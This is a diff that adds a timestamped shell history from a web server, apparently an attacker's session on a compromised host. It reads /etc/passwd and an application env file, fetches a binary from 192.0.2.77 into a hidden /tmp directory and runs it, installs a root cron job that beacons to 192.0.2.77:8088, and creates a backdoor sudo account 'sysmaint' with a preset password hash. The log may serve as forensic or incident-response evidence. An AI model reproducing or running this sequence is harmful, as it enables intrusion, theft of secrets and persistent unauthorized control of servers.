@@ -1,0 +1,29 @@
+  141  2026-04-21 14:18:19 id
+  142  2026-04-21 14:18:24 whoami
+  143  2026-04-21 14:18:31 pwd
+  144  2026-04-21 14:18:38 uname -a
+  145  2026-04-21 14:18:53 ls -la /var/www/html/espace-adherents
+  146  2026-04-21 14:19:01 cat /etc/passwd | tail
+  147  2026-04-21 14:19:12 cat /var/www/html/espace-adherents/config/app.env
+  148  2026-04-21 14:19:20 sudo -l
+  149  2026-04-21 14:19:28 mkdir -p /tmp/.cache
+  150  2026-04-21 14:19:39 wget -O /tmp/.cache/system-check http://192.0.2.77/updates/system-check.txt
+  151  2026-04-21 14:19:48 chmod +x /tmp/.cache/system-check
+  152  2026-04-21 14:20:04 /tmp/.cache/system-check --mode dry-run --target 192.0.2.77:8088
+  153  2026-04-21 14:20:22 ls -la /tmp/.cache
+  154  2026-04-21 14:20:41 cat /etc/hosts
+  155  2026-04-21 14:20:55 getent passwd svc-web
+  156  2026-04-21 14:21:42 printf '*/10 * * * * root /usr/local/bin/system-cache-refresh.sh >/dev/null 2>&1\n' | sudo /usr/bin/tee /etc/cron.d/system-cache >/dev/null
+  157  2026-04-21 14:22:03 printf '#!/bin/sh\n/tmp/.cache/system-check --mode beacon --target 192.0.2.77:8088\n' | sudo /usr/bin/tee /usr/local/bin/system-cache-refresh.sh >/dev/null
+  158  2026-04-21 14:22:16 sudo chmod 755 /usr/local/bin/system-cache-refresh.sh
+  159  2026-04-21 14:22:31 crontab -l
+  160  2026-04-21 14:22:45 ss -tunap | grep 8088
+  161  2026-04-21 14:23:04 history | tail -n 20
+  162  2026-04-21 14:23:19 cat /etc/group | grep sudo
+  163  2026-04-21 14:23:46 ls -la /usr/local/bin
+  164  2026-04-21 14:24:12 cat /etc/issue
+  165  2026-04-21 14:25:11 sudo /usr/sbin/useradd -m -s /bin/bash -G sudo sysmaint
+  166  2026-04-21 14:25:31 echo 'sysmaint:$y$j9T$PdCdsu4l7s3A2hnj$seO2.HMDk6Gpw3VnagZBmwn1w3Ab8cnbGhXbPjUQ8gF' | sudo /usr/sbin/chpasswd -e
+  167  2026-04-21 14:25:46 grep sysmaint /etc/passwd
+  168  2026-04-21 14:26:08 true
+  169  2026-04-21 14:26:40 exit
